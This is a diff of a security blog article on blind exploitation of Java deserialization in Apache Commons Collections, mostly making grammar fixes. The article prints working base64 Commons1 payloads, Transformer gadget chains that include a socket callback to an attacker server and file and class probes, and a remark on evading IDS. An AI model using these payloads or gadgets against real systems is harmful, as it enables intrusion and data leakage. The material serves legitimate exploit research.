@@ -44,20 +44,20 @@ There are 2 main Commons exploits classes (w.r.t. payload construction):
 
 * One uses _[javassist]_ for payload construction. It takes Java code (payload) as a string, builds bytecode from it and constructs
 final serialized shellcode.
-This is a very strong approach as we can basically express every program with it (e.g., reverse shell). Unfortunately if the system
-running the Java program is updated (Java) this method won't work as essential classes do not allow bytecode execution anymore.
-I won't go into these kind of exploits as it is easy to patch them. If they are not patched, you can build you own gadgets
+This is a very strong approach as we can basically express every program with it (e.g., reverse shell). Unfortunately, if the system
+running the Java program is updated (Java), this method won't work as essential classes do not allow bytecode execution anymore.
+I won't go into these kind of exploits as it is easy to patch them. If they are not patched, you can build your own gadgets
 quite easily.
 
-* Another one uses chain of Transformers - objects defined in Commons library, which can be leveraged to do RCE
-using reflection by crafting the chain. In this case we loose expressivity as the code being executed on the target machine has
-to be expressed via chain of Transformers. Only small subgroup of programs can be expressed using these gadgets. This
-makes building nice gadgets for this class of exploit challenging.
+* Another one uses a chain of Transformers - objects defined in Commons library, which can be leveraged to do RCE
+using reflection by crafting the chain. In this case we lose expressivity as the code being executed on the target machine has
+to be expressed via a chain of Transformers. Only a small subgroup of programs can be expressed using these gadgets. This
+makes building nice gadgets for this class of exploits challenging.
 Fortunately for us, it enables RCE - system command execution.
 In this article I focus on interesting gadgets one can construct using this method.
 
 So if the server running the vulnerable Java server is updated (i.e., Java is updated), the first class of exploits won't work.
-Well, we can still do RCE. Typical scenario would be to run reverse shell on the target machine. I.e., let
+Well, we can still do RCE. A typical scenario would be to run reverse shell on the target machine, i.e., let
 vulnerable Java server connect to our server and execute all commands we send to it.
 
 But what if the system is firewalled so well no outgoing connections can leave the vulnerable machine? Or if there
@@ -65,7 +65,7 @@ are strong _SecurityManager_ policies in place? Then we cannot communicate with 
 but without communication we can hardly see the result of our payload being executed.
 
 In that case we need to learn more information about the target system and find a way to send data back to us.
-For the communication we use covert channels as in case of Blind SQL Injection.
+For the communication we use covert channels as in the case of Blind SQL Injection.
 
 ## Sending data back from the victim {#databack}
 If we are lucky enough, the target system shows us an error when we want it to show.
@@ -77,11 +77,11 @@ if (System.getProperty("user.name").equals("root")){
 }
 ```
 
-This gives us 1 bit of information at a time. If current user is a "root", page produces an Exception and we know the user.
+This gives us 1 bit of information at a time. If the current user is the "root", the page produces an Exception and we know the user.
 Otherwise the page loads normally.
 
-If this is not the case and the server filters exceptions somehow
-we can use the timing approach which works very well but takes some time and is not 100% reliable.
+If this is not the case and the server filters exceptions somehow, 
+we can use the timing approach, which works very well but takes some time and is not 100% reliable.
 
 ```java
 if (System.getProperty("user.name").equals("root")){
@@ -89,10 +89,10 @@ if (System.getProperty("user.name").equals("root")){
 }
 ```
 
-In this case page load sleeps for 7 seconds if current user is root. [sqlmap] uses the same approach to read entire databases.
+In this case the page loading sleeps for 7 seconds if the current user is root. [sqlmap] uses the same approach to read entire databases.
 It uses binary search on the characters to read the strings and send them to the attacker. E.g. the following
 code sleeps for 7 seconds if the first character is in the interval of `a-j`. We can learn the first character of the string
-in `ceil(log(N))` queries where N is size of the alphabet. When using printable ASCII alphabet with 101 characters its 7 steps.
+in `ceil(log(N))` queries where N is size of the alphabet. When using the printable ASCII alphabet with 101 characters, it's 7 steps.
 
 ```java
 if (System.getProperty("user.name").substring(0, 1).matches("[a-j]")) {
@@ -100,28 +100,28 @@ if (System.getProperty("user.name").substring(0, 1).matches("[a-j]")) {
 }
 ```
 
-There are also problems with this method. If network connection is not good enough it adds noise and some queries
-can be interpreted in a wrong way (i.e., page did not sleep, loading still took a long time).
+There are also problems with this method. If network connection is not good enough, it adds noise and some queries
+can be interpreted in a wrong way (i.e., the page did not sleep, but the loading still took a long time).
 
 ## Payload builder & exploitation {#server}
 
 It's not necessary to understand the whole principle of Java Deserialization vulnerability in order to understand this article.
-For those unfamiliar with all the technical details is safe to assume the upper payload is constructed (by [ysoserial] tool) in such a way
+For those unfamiliar with all the technical details it is safe to assume the upper payload is constructed (by [ysoserial] tool) in such a way
 the deserialization leads to executing the top [Transformer](#transformers) object which is serialized in the payload.
-Transformers can contain another transformers and with this we construct useful exploitation gadget.
+Transformers can contain other transformers and with this we construct a useful exploitation gadget.
 If you want to know more, I recommend [Understanding ysoserial's CommonsCollections1 exploit] and
 [What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability].
 
 In this article we present ideas of exploitation in restricted environment. We state gadgets that we deem
-useful and that are possible to express in chain of Transformers. Transformation of the code to the
+useful and that are possible to express in a chain of Transformers. The transformation of the code to the
 Transformer chain is demonstrated.
 
 For practical demonstration of this blind approach see the [part2] of our blogpost.
 
 ## Gadgets {#gadgets}
-The sleep gadget is very nice to detect if the system is vulnerable to given class of exploits.
-So instead of running `calc.exe` (as [ysoserial] uses for demo) we do `Thread.sleep(7000);`. If system is vulnerable,
-page sleeps for a while. Bam.
+The sleep gadget is very nice to detect if the system is vulnerable to a given class of exploits.
+So instead of running `calc.exe` (as [ysoserial] uses for demo) we do `Thread.sleep(7000);`. If the system is vulnerable,
+the page sleeps for a while. Bam.
 
 Gadget for sleep:
 
@@ -149,7 +149,7 @@ Working payload for Commons1 exploit:
 rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEGphdmEubGFuZy5UaHJlYWQAAAAAAAAAAAAAAHhwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AAVzbGVlcHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAARsb25nAAAAAAAAAAAAAAB4cHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAFzcgAOamF2YS5sYW5nLkxvbmc7i+SQzI8j3wIAAUoABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAAAAG1h0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgARdnIAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAAB4cHNxAH4AFnB0AAtuZXdJbnN0YW5jZXBzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAQdwgAAAAQAAAAAHh4dnIAEmphdmEubGFuZy5PdmVycmlkZQAAAAAAAAAAAAAAeHBxAH4AOg==
 ```
 
-### Terminating transformer chain {#terminating}
+### Terminating the transformer chain {#terminating}
 The Commons1 Transformer gadgets have a typical structure (by [ysoserial]):
 
 ```java
@@ -158,8 +158,8 @@ new ConstantTransformer(1)
 ```
 
 The final _[ConstantTransformer](#ConstantTransformer)_ causes an exception during deserialization (after our payload executes). You may want it like
-this. But if you want to page load successfully in some cases, the exception is not desirable. The upper gadget layer expects a Set
-object (gets Integer - exception). To avoid the exception the last chain should create a set instance:
+this. But if you want the page to load successfully in some cases, the exception is not desirable. The upper gadget layer expects a Set
+object (gets Integer - exception). To avoid the exception, the last chain should create a set instance:
 
 ```java
 new ConstantTransformer(java.util.HashSet.class),
@@ -168,25 +168,25 @@ new InvokerTransformer("newInstance",
 ```
 
 ### Wrapping in collections {#wrapping}
-[ysoserial] tool generates payloads which are after deserialization seen as `sun.reflect.annotation.AnnotationInvocationHandler`.
+[ysoserial] tool generates payloads which, after deserialization, are seen as `sun.reflect.annotation.AnnotationInvocationHandler`.
 If you deserialize the example payload from the above, it will be of this type.
 
-If your vulnerable application expects a collection it usually throws ClassCastException.
-You can actually avoid this ClassCastException by wrapping payload inside the collection to let application feel OK and
+If your vulnerable application expects a collection, it usually throws ClassCastException.
+You can actually avoid this ClassCastException by wrapping the payload inside a collection to let the application feel OK and
 still execute our payload during deserialization.
 
-For example if application expects a List, we can construct a List and add payload as another list element.
-It still get executed, but without exception being thrown (if we are lucky and application ignores unknown element).
+For example if an application expects a List, we can construct a List and add the payload as another list element.
+It still gets executed, but without an exception being thrown (if we are lucky and the application ignores unknown elements).
 
 ```
 rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAADdwQAAAADc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAF0AAtIZWxsbyB3b3JsZHNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AAZzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEGphdmEubGFuZy5UaHJlYWQAAAAAAAAAAAAAAHhwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AAVzbGVlcHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAARsb25nAAAAAAAAAAAAAAB4cHQACWdldE1ldGhvZHVxAH4AJAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ACRzcQB+ABx1cQB+ACEAAAACcHVxAH4AIQAAAAFzcgAOamF2YS5sYW5nLkxvbmc7i+SQzI8j3wIAAUoABXZhbHVleHEAfgADAAAAAAAAG1h0AAZpbnZva2V1cQB+ACQAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAhc3EAfgAXdnIAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAAB4cHNxAH4AHHB0AAtuZXdJbnN0YW5jZXBzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAQdwgAAAAQAAAAAHh4dnIAEmphdmEubGFuZy5PdmVycmlkZQAAAAAAAAAAAAAAeHBxAH4AP3g=
 ```
 
-Payload gets executed during deserialization. After that the resulting type is `LinkedList` with contents:
+The payload gets executed during deserialization. After that, the resulting type is `LinkedList` with contents:
 `[1, Hello world, sun.reflect.annotation.AnnotationInvocationHandler@345dc05c]`.
 
-Even better is if the application serializes a `Map` (e.g., settings). You can sneak payload to the HashMap
-under the key application does not use. In that case payload gets executed and application does not throw an exception.
+It gets even better if the application serializes a `Map` (e.g., settings). You can sneak payload to the HashMap
+under a key the application does not use. In that case, the payload gets executed and the application does not throw an exception.
 
 Our modified version of [ysoserial] demonstrates how to wrap payload in other structures.
 
@@ -214,7 +214,7 @@ new ConstantTransformer(Socket.class),
                     Object[].class
             },
             new Object[]{
-                    new Object[] {host, port}
+                    new Object[] { host, port }
             }),
     new InvokerTransformer("sendUrgentData",
             new Class[]{
@@ -225,32 +225,32 @@ new ConstantTransformer(Socket.class),
             }),
 ```
 
-With this gadget we can send some static data to our server. On ourserver.com we trace
-incoming packets. If a new TCP connection from our target host is made, with Urgent flag and 0xdd byte we know
+With this gadget, we can send some static data to our server. On ourserver.com we trace
+incoming packets. If a new TCP connection from our target host is made with Urgent flag and 0xdd byte, we know
 the JVM is allowed to connect to the remote host.
 
-_SendUrgentData_ part is optional. We can leave it out. Firewall may be configured to drop/log Urgent data. So we may
-avoid detection by IDS without the urgent data. Socket should still make TCP handshake - visible in packet trace.
+The _sendUrgentData_ part is optional. The firewall may be configured to drop/log Urgent data, so without the urgent data, 
+we may avoid detection by the IDS. The socket should still make the TCP handshake - visible in packet trace.
 
-It would be also nice to call the following gadget to write to the output stream directly:
+It would also be nice to call the following gadget to write to the output stream directly:
 
 ```java
 Socket.class.getConstructor(String.class, Integer.TYPE).newInstance("ourserver.com", 80).getOutputStream().write(0xdd);
 ```
 
-But this is not possible due to limitation of reflection invocation properties of [InvokerTransformer](#InvokerTransformer).
-For more info why its not possible read article till the end :)
-(TL;DR: output stream returned is actually SocketOutputStream which is package local - write() method cannot be called this way).
+But this is not possible due to the limitation of reflection invocation properties of [InvokerTransformer](#InvokerTransformer).
+For more info why it's not possible read this article till the end :)
+(TL;DR: the output stream returned is actually SocketOutputStream which is package-local - the write() method cannot be called this way).
 
 ### Classloading gadgets {#classloader}
 This very simple gadget tries to load a class defined by a fully specified class name.
-If loading of such class ends with an exception we know it was not found by the Classloader.
+If the loading of such class ends with an exception, we know it was not found by the Classloader.
 
-If vulnerable app behaves differently on exception its straightforward. Otherwise
-we adapt the payload to Sleep after loading the class - if class exists on the classpath, exception is not thrown and Sleep
+If a vulnerable app behaves differently on exception, it's straightforward. Otherwise, 
+we adapt the payload to Sleep after loading the class - if the class exists on the classpath, the exception is not thrown and Sleep
 will get executed.
 
-Classloading gadget can be used to detect if library is present on the system or to detect major Java version running the application.
+Classloading gadget can be used to detect if a library is present on the system or to detect the major Java version running the application.
 
 The gadget is:
 
@@ -271,7 +271,7 @@ new InvokerTransformer("forName",
         })
 ```
 
-With this we can check:
+With this we can check, for instance:
 
 * `org.apache.commons.io.FileUtils` for Apache commons-io
 * `java.util.logging.SocketHandler` should exist from Java 4. Has `@since 1.4` annotation.
@@ -282,8 +282,8 @@ With this we can check:
 
 ### File exists test {#fileexists}
 
-This forms a predicate gadget, returning true if file exists.
-Note SecurityManager may be in place and code can throw an exception - we will handle that later.
+This forms a predicate gadget, returning true if a file exists.
+Note the SecurityManager may be in place and the code can throw an exception - we will handle that later.
 
 ```java
 if (File.class.getConstructor(String.class).newInstance(path).exists()){
@@ -331,8 +331,8 @@ TransformerUtils.switchTransformer(
 ```
 
 This looks more complicated and consists of more sub-components.
-We made utility functions to make gadget construction simpler, e.g., sleeping gadget
-is independent component and can be constructed by a dedicated method. For more see TODO: XXX.
+We created utility functions to make the gadget construction simpler, e.g., the sleeping gadget
+is an independent component and can be constructed by a dedicated method. For more see TODO: <-- :) .
 
 This construction can be easily generalized to a form `if (predicate) do action` where `action`
 can be
@@ -342,25 +342,25 @@ can be
 * Connecting with the socket
 
 There are more interesting methods returning boolean that can be used to leak something useful
-(e.g., `canRead`, `canWrite`, string methods).
+(e.g., `canRead`, `canWrite`, String methods).
 
 ### String reading {#strings}
-Transformers cannot be used in such a way result of the computation (i.e., file read to string) is a parameter of the method.
-Thus it is not possible to read file into string and send the whole string over a socket.
+Transformers cannot be used in such a way the result of the computation (i.e., a file read to string) is a parameter of the method.
+Thus it is not possible to read a file into string and send the whole string over a socket.
 
-We can call only methods on the result. If it is a string we can do:
+We can only call methods on the result. If it is a string, we can do:
 
-* `string.isEmpty()` predicate to test if string is empty.
+* `string.isEmpty()` predicate to test if the string is empty.
 * `string.contains(staticString)`
 * `string.startsWith(staticString)`
 * `string.endsWith(staticString)`
 * `string.equals(staticString)`
 * `string.equalsIgnoreCase(staticString)`
 * `string.substring(0, x)` for getting portion of the string or checking the string length. IndexOutOfBoundsException is thrown.
-* `string.substring(0, x).matches("[a-j]")` predicate for binary searching the x-th character.
+* `string.substring(x-1, x).matches("[a-j]")` predicate for binary searching the x-th character.
 
-The last one is quite important gadget. With this we can basically read all the strings but
-for that we would need a tool that does the search on the fly - generates payloads and processes the results.
+The last one is a quite important gadget. With this, we can basically read all the strings but
+for that, we would need a tool that does the search on the fly - generates payloads and processes the results.
 
 ### File reading {#fileread}
 The following gadget reads the whole file into a string using a trick with _Scanner_:
@@ -1318,7 +1318,7 @@ public Object transform(Object input) {
 [sqlmap]: https://github.com/sqlmapproject/sqlmap
 [ysoserial]: https://github.com/frohoff/ysoserial
 [SO01]: http://stackoverflow.com/questions/228477/how-do-i-programmatically-determine-operating-system-in-java
-[javassist]: www.javassist.org/
+[javassist]: http://jboss-javassist.github.io/javassist
 [Understanding ysoserial's CommonsCollections1 exploit]: http://gursevkalra.blogspot.cz/2016/01/ysoserial-commonscollections1-exploit.html
 [What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability]: https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#exploitdev
 [part2]: https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html
